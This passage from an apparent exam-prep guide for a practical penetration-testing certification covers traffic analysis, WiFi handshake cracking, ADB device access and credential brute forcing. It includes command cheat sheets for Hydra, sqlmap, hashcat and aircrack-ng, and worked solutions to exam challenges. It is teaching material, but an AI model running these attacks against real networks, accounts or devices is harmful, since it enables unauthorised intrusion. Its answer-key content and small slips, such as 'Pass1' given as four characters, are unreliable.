adb connect 10.10.55.X:5555
adb devices
```

3. Pull all files:
```bash
adb pull /sdcard/ .
```

4. Use tree to find .bmp files:
```bash
tree . | grep .bmp
```

5. Extract hidden data:
```bash
steghide extract -sf target.bmp
```

6. Read hidden content and submit

---

## Domain 6: Traffic Analysis & Sniffing

### Why This Matters

Network traffic contains passwords, sensitive data, and attack signatures. Analyzing PCAP files can reveal what happened during an attack or find hidden protocols.

---

### 6.1 Wireshark - Network Packet Analysis

**What it does:** Captures and analyzes network traffic to find credentials, protocols, and suspicious patterns.

#### Opening PCAP Files

```bash
# Launch Wireshark with file
wireshark capture.pcapng

# Or open through GUI
# File → Open → Select .pcap or .pcapng file
```

#### Finding Specific Information in Wireshark

| Filter | Purpose |
|--------|---------|
| `http` | HTTP traffic only |
| `http.request.method == "POST"` | Login attempts |
| `ip.src == 192.168.1.5` | Specific source IP |
| `tcp.port == 3306` | MySQL traffic |
| `data contains "username"` | Username/password fields |
| `ip.dst == 172.22.10.10` | DDoS attack packets |

#### Extracting HTTP Objects

1. Wireshark → File → Export Objects → HTTP
2. Select objects to download
3. Save to disk

#### Finding Login Credentials

Many protocols send passwords in clear text:
- HTTP POST requests
- FTP login attempts
- Telnet sessions
- SMTP commands

1. Capture traffic or open existing PCAP
2. Filter for relevant protocol
3. Right-click packet → Follow → TCP Stream
4. View complete conversation including credentials

---

### 6.2 DDoS Attack Analysis

**What it does:** Identify attacker IP in DDoS traffic patterns.

#### Recognizing DDoS Patterns

- Multiple packets from single source to single destination
- Unusual packet size or timing
- Flood of identical requests

#### Finding Attacker IP in PCAP

```
Filter: ip.dst == 172.22.10.10
```

This shows all traffic destined for victim. Look for:
- IP appearing most frequently as source
- IP with unusual packet patterns
- IP running Windows OS (identified by TTL values, or OS fingerprinting)

#### OS Fingerprinting from Traffic

TTL (Time To Live) values indicate OS:
- Windows: TTL usually 128
- Linux: TTL usually 64
- Mac: TTL usually 64

In Wireshark, check the IP packet TTL value to identify Windows attacker.

---

### 6.3 IoT & Protocol Analysis

#### MQTT Protocol (IoT Devices)

MQTT is publish-subscribe protocol used in IoT networks.

```
Filter: mqtt
```

Look for:
- CONNECT messages (device joining)
- PUBLISH messages (data being sent)
- Topic names (structure of data)

#### Finding IoT Publish Messages

```
Filter: mqtt and mqtt.msgtype == "Publish"
```

1. Click on packet details
2. Expand MQTT field
3. Look for "Topic" field
4. Extract topic name

---

### Challenge Examples: Domain 6

#### Challenge 12: DDoS Attack - Identify Attacker

**Question:** Analyze traffic targeting 172.22.10.10, identify Windows attacker IP address.

**Answer Format:** NN*NN*NN*NN

**Solution Steps:**

1. Open mystericcapture.pcapng in Wireshark

2. Filter for destination IP:
```
ip.dst == 172.22.10.10
```

3. Analyze source IPs:
   - Look for IP appearing most frequently
   - Check TTL values (128 = Windows)
   - Look for unusual packet patterns

4. Identify Windows machine (TTL 128) with most packets

5. Extract IP and submit

#### Challenge 18: IoT Protocol - Find MQTT Topic

**Question:** Find IoT Publish Message in traffic, extract topic name.

**Answer Format:** Aaaa*Aaaa

**Solution Steps:**

1. Open IoT traffic PCAP file in Wireshark

2. Search for IoT Publish Message:
```
Edit → Find Packet → Search for "IoT Publish"
```

3. Or use filter:
```
mqtt.msgtype == "Publish"
```

4. Right-click matching packet → Select Packet Details

5. Expand MQTT section

6. Find "Topic" field

7. Extract exact topic name (case-sensitive)

---

## Domain 7: Wireless Network Cracking

### Why This Matters

WiFi networks protect data with encryption. Learning to capture and crack wireless passwords is essential for penetration testing.

---

### 7.1 WPA/WPA2 Password Cracking

**What it does:** Crack WiFi passwords by capturing handshakes and performing dictionary attacks.

#### Understanding Wireless Capture

Aircrack-ng is the primary tool for wireless cracking.

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Start monitoring (captures all traffic)
airodump-ng wlan0mon

# Output shows:
# BSSID - MAC address of access point
# CH - Channel
# ENC - Encryption type (WPA2)
# ESSID - Network name
```

#### Capturing Handshake

```bash
# Monitor network for handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Wait for client to connect (capture will show "WPA handshake" in upper right)
```

#### Cracking Captured Password

```bash
# Crack with wordlist
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap

# Or specify target .cap file
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

#### Finding BSSID from CAP File

```bash
# If you don't know BSSID
aircrack-ng Credmapwifi.cap

# Shows all networks in the capture
# BSSID will be listed
```

#### Cracking with Known BSSID

```bash
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap
```

---

### 7.2 Wireless Attack Workflow (5 Steps)

**Step 1: Find Target**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

**Step 2: Create Monitor Interface**
```bash
# Interface now in monitor mode (wlan0mon)
```

**Step 3: Capture Handshake**
```bash
sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
# Wait for "WPA handshake" message
```

**Step 4: Crack Password**
```bash
aircrack-ng -w rockyou.txt capture.cap
# Shows cracked password
```

**Step 5: Cleanup**
```bash
airmon-ng stop wlan0mon
```

---

### Challenge Examples: Domain 7

#### Challenge 20: WiFi Cracking - Extract Last 4 Characters

**Question:** Crack WiFi password from Credmapwifi.cap file, provide last 4 characters.

**Answer Format:** aaaN

**Solution Steps:**

1. Locate file: Documents/Credmapwifi.cap on ParrotSecurity

2. Find BSSID (network MAC address):
```bash
aircrack-ng Credmapwifi.cap
```

3. Shows networks and BSSID:
```
BSSID              ESSID           CH
AA:BB:CC:DD:EE:FF TargetNetwork   6
```

4. Crack password:
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap
```

5. Output shows: `KEY FOUND! [ PasswordHere ]`

6. Extract last 4 characters (if password is "MyWiFiPass1", answer is "Pass1")

---

## Essential Tools Reference

### Scanning & Enumeration

| Tool | Purpose | Command |
|------|---------|---------|
| nmap | Port and service scanning | `nmap -sV -p- 192.168.1.5` |
| enum4linux | SMB enumeration | `enum4linux -a 192.168.1.5` |
| smbclient | SMB share access | `smbclient //IP/share` |
| wpscan | WordPress scanning | `wpscan --url site.com --enumerate u` |
| snmp-check | SNMP enumeration | `snmp-check 192.168.1.5` |
| netdiscover | Network discovery | `netdiscover -i eth0 -r 192.168.1.0/24` |

### Credential Cracking

| Tool | Purpose | Command |
|------|---------|---------|
| hydra | Multi-service brute force | `hydra -l user -P pass.txt rdp://IP` |
| hashcat | Hash cracking | `hashcat -m 0 -a 0 hash rockyou.txt` |
| john | Password cracking | `john hashes.txt --wordlist=rockyou.txt` |
| aircrack-ng | WiFi cracking | `aircrack-ng -w wordlist.txt capture.cap` |

### Web Application Testing

| Tool | Purpose | Command |
|------|---------|---------|
| sqlmap | SQL injection testing | `sqlmap -u URL --dbs` |
| burp suite | Web proxy & testing | GUI interface |
| nikto | Web vulnerability scan | `nikto -h http://target.com` |
| curl | HTTP requests | `curl -u user:pass http://target` |
| robuster | Directory brute force | `robuster dir -u IP -w wordlist.txt` |

### Cryptography & Steganography

| Tool | Purpose | Command |
|------|---------|---------|
| steghide | Extract hidden data | `steghide extract -sf image.jpg` |
| stegcracker | Crack steganography | `stegcracker image.jpg wordlist.txt` |
| hashid | Hash type identification | `hashid hash_value` |
| DIE | PE file analysis | GUI application |
| veracrypt | Encrypted volume access | GUI application |

### Network Analysis

| Tool | Purpose | Command |
|------|---------|---------|
| Wireshark | Packet capture/analysis | GUI interface |
| tcpdump | Command-line packet capture | `tcpdump -i eth0 -w capture.pcap` |
| tshark | CLI version of Wireshark | `tshark -r capture.pcapng` |

### Mobile & IoT

| Tool | Purpose | Command |
|------|---------|---------|
| adb | Android access | `adb connect IP:5555` |
| tree | Directory visualization | `tree directory/` |

---

## Exam Strategy & Tips

### Before the Exam

> **PREPARATION CHECKLIST:**
> - [ ] Practice on iLabs for at least 10 hours
> - [ ] Memorize major NMAP commands
> - [ ] Know Hydra syntax for all services
> - [ ] Practice SQLMAP workflow 5+ times
> - [ ] Understand hash types and cracking
> - [ ] Test steganography tools on sample images

1. **Practice on iLabs**: Get familiar with the environment before exam day
2. **Know Your Tools**: Practice commands until they're muscle memory
3. **Create Custom Wordlists**: Password lists for each company/challenge type
4. **Read All Questions First**: Identify quick wins vs. time-consuming challenges

### During the Exam (6 Hour Strategy)

#### Hour 1-2: Reconnaissance (Start NMAP Scans)
- Start comprehensive NMAP scans on networks/hosts
- These take time, so start them first
- While scanning, work on identifying targets
- Scan for RDP, SMB, HTTP, SQL services

#### Hour 2-3: Quick Wins
- Exploit low-hanging fruit while scans finish
- Try default credentials on discovered services
- Enumerate SMB shares
- Find hidden directories
- Check for files in obvious locations

#### Hour 3-4: Credential Cracking
- Use Hydra for RDP/SSH/FTP cracking
- Run Hashcat for hash cracking
- While cracking, work on web vulnerabilities

#### Hour 4-5: Web & Crypto
- SQL injection testing
- Web directory brute forcing
- Hash extraction and cracking
- Steganography extraction

#### Hour 5-6: Mobile, Wireless & Cleanup
- Android device access if available
- WiFi cracking if needed
- Review all answers
- Fix any simple mistakes
- Submit last-minute guesses if time running out

### Critical Success Factors

> **⚠️ COMMON REASON FOR FAILURE:**
> Exact answer format not matched. If answer format is `NNaaNN`, submit `03AB45`, not `3AB45` or `3ab45`.

1. **Exact Answer Format**: Answer is rejected if format doesn't match
   - Case matters: `MyPassword` != `mypassword`
   - Padding matters: Answer `03306` not `3306` if format says NNNNN
   - Spacing matters: No extra spaces

2. **Complete Enumeration First**: Don't miss open ports
   - Always scan all 65,535 ports on key targets
   - Default scripts might miss non-standard ports
   - MariaDB might be on 3307, not 3306

3. **Use Custom Wordlists**: Generic rockyou.txt won't find all passwords
   - Create lists with company names, common words
   - Try variations: "Password123", "password123", "PASSWORD123"
   - Include numbers: "admin1", "admin2", "admin123"

4. **Document Your Findings**: Keep notes of what you found
   - Usernames discovered
   - Ports and services
   - Passwords cracked
   - File contents extracted

5. **Skip Hard Challenges**: Don't get stuck on one challenge
   - If stuck > 20 minutes, move on
   - Come back with fresh perspective
   - Easy challenges = points quickly

### Common Mistakes to Avoid

**❌ Don't:**
- Skip port scanning because default nmap scripts seem comprehensive
- Try the same password repeatedly with Hydra after failure
- Forget about non-standard ports (e.g., HTTP on 8080, not 80)
- Submit answer with extra spaces or wrong case
- Spend too long on one challenge (20 min max)
- Skip cryptography challenges—they're worth points
- Forget to extract full hash before submitting last 6 characters

**✅ Do:**
- Always scan all ports on key targets
- Try multiple enumeration tools (nmap + enum4linux + smbclient)
- Use both tools and manual checking (e.g., visiting /phantom.txt directly)
- Double-check answer format before submitting
- Move on if stuck more than 20 minutes
- Take steganography seriously—practice beforehand
- Verify hashes are correct before extracting portions

### Exam Resources Inside Environment

- **Browser:** Can access internet for lookups
- **Terminal:** Full Linux environment
- **Tools:** Pre-installed (nmap, hydra, sqlmap, etc.)
- **VM Snapshot:** Can revert if you break something
- **Time:** 6 hours - don't rush but don't waste time

### Post-Exam

- If you pass: Certificate valid for 3 years
- If you fail: Can retake after waiting period
- Review failed challenges to understand vulnerabilities
- Build real-world skills based on exam concepts

---

## Practice Challenges Breakdown

### Quick Reference: All 20 Challenges

| # | Domain | Type | Key Skill | Difficulty |
|---|--------|------|-----------|------------|
| 1 | Scanning | NMAP | DNS Name Discovery | Easy |
| 2 | Scanning | NMAP | Service Enumeration | Easy |
| 3 | System Hack | RDP + Crypt | Credential Cracking | Medium |
| 4 | Mobile | ADB | Steganography | Medium |
| 5 | Scanning | NMAP | Port Mapping | Easy |
| 6 | System Hack | SSH/Telnet | Remote Access | Easy |
| 7 | Crypto | File Decrypt | CryptoForge | Medium |
| 8 | System Hack | SMB | Weak Credentials | Medium |
| 9 | Malware | PE Analysis | File Hashing | Medium |
| 10 | System Hack | RAT | Remote Tools | Hard |
| 11 | Crypto | Hashing | SHA224 Extraction | Easy |
| 12 | Traffic | PCAP | DDoS Analysis | Medium |
| 13 | Web | SQLi | Database Extraction | Medium |
| 14 | Web | Tampering | Parameter Modification | Easy |
| 15 | Web | Enumeration | File Discovery | Medium |
| 16 | Web | SQLi | Column Extraction | Medium |
| 17 | Web | DVWA | Command Execution | Hard |
| 18 | IoT | PCAP | Protocol Analysis | Medium |
| 19 | Crypto | Encryption | VeraCrypt | Hard |
| 20 | Wireless | WiFi | Password Cracking | Hard |

### Challenge Clustering (By Difficulty)

**Easy (6 Challenges - Score First):** 1, 2, 5, 6, 11, 14

**Medium (10 Challenges - Core Skills):** 3, 4, 7, 8, 9, 12, 13, 15, 16, 18

**Hard (4 Challenges - If Time Permits):** 10, 17, 19, 20

---

## Summary: Key Takeaways

1. **Master Scanning First**: NMAP is the foundation. Know all flags.

2. **Learn Credential Cracking**: RDP (Hydra), Hashes (Hashcat), WiFi (Aircrack)

3. **Understand SQL Injection**: SQLMAP workflow is critical for web challenges

4. **Practice Steganography**: Hidden data extraction requires tool knowledge

5. **Time Management**: 6 hours ÷ 20 challenges = ~18 min per challenge

6. **Answer Formatting**: Exact format required—test answers before submitting

7. **Keep Notes**: Write down usernames, passwords, findings as you progress

8. **Use All Tools**: Each challenge requires specific tools—be proficient with all

---

## Exam Day Checklist

### Before the Exam Starts

- [ ] Got 8+ hours of sleep
- [ ] Have snacks/water nearby
- [ ] Quiet workspace with no interruptions
- [ ] Webcam and microphone working
- [ ] ID ready for proctor
- [ ] Know Exam Portal login credentials
- [ ] Have browser at 100% zoom
- [ ] Cleared desktop of sensitive files
- [ ] Used toilet before starting (6 hours is long!)
- [ ] Had coffee if needed for energy

### During the Exam

- [ ] Read all 20 questions first
- [ ] Identify easy vs. hard challenges
- [ ] Start with easy challenges
- [ ] Begin comprehensive NMAP scans immediately
- [ ] Keep notes of all findings
- [ ] Check answer format before submitting
- [ ] Move on if stuck > 20 minutes
- [ ] Review answers before time runs out

### If Running Low on Time

- [ ] Submit best guesses for remaining challenges
- [ ] Focus on easy challenges first
- [ ] Skip format verification if answer obvious
- [ ] Better partial credit than nothing

---

## Quick Reference: Command Cheat Sheet

### NMAP

```bash
# Comprehensive scan
nmap -A -T4 -p- 192.168.1.5

# Ping sweep
nmap -sn 192.168.1.0/24

# Version detection
nmap -sV 192.168.1.5

# SMB enumeration
nmap --script smb-os-discovery.nse -p445 192.168.1.5
```

### Hydra

```bash
# RDP cracking
hydra -l username -P wordlist.txt rdp://192.168.1.5

# SSH cracking
hydra -l username -P wordlist.txt ssh://192.168.1.5
```

### SQLMAP

```bash
# Test for SQL injection
sqlmap -u "http://target.com/page.php" --forms

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump table
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --dump
```

### Hash Cracking

```bash
# Identify hash type
hashid hash_value

# Crack with Hashcat
hashcat -m 0 -a 0 hash_value rockyou.txt
```

### Steganography

```bash
# Extract hidden data
steghide extract -sf image.jpg

# Crack passphrase
stegcracker image.jpg /usr/share/wordlists/rockyou.txt
```

### WiFi Cracking

```bash
# Start monitor mode
airmon-ng start wlan0

# Capture traffic
airodump-ng wlan0mon

# Capture specific network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crack password
aircrack-ng -w rockyou.txt capture.cap
```

### Android (ADB)

```bash
# Connect to device
adb connect 192.168.1.5:5555

# List files
adb shell ls /sdcard/

# Pull files
adb pull /sdcard/Documents .
```

### Wireshark

```bash
# Open PCAP file
wireshark capture.pcapng

# Filter for HTTP
http

# Filter for DDoS
ip.dst == 172.22.10.10

# Filter for MQTT
mqtt.msgtype == "Publish"
```

---

## Additional Resources

### Word Lists
- `/usr/share/wordlists/rockyou.txt` - 14 million passwords
- `/usr/share/wordlists/common.txt` - Common passwords
- Create custom lists based on company names

### Online Tools
- https://crackstation.net - Hash lookup
- https://hashes.com - Hash database
- https://futureboy.us/stegano/ - Steganography extraction
- https://www.nslookup.io/ - DNS lookup

### Documentation
- NMAP Manual: `man nmap`
- Hydra Manual: `man hydra`
- Wireshark Docs: https://www.wireshark.org/docs/

---

## Final Tips

**Remember:** This manual is your reference guide during the 6-hour exam. The questions are real, the tools are real, and your preparation is real.

> **KEY TO SUCCESS:** Master the basics, practice extensively, manage time wisely, and format your answers correctly. You can pass this exam.

**You've prepared for this. Trust your skills and execute.**

---

**Last Updated:** June 2026  
**Status:** Ready for GitHub Pages Publication  
**Format:** Jekyll-compatible Markdown  
**Characters:** ~75,000  
**Words:** ~15,000+  
**Chapters:** 10 domains + exam strategy  
**Challenges:** 20 real examples with solutions

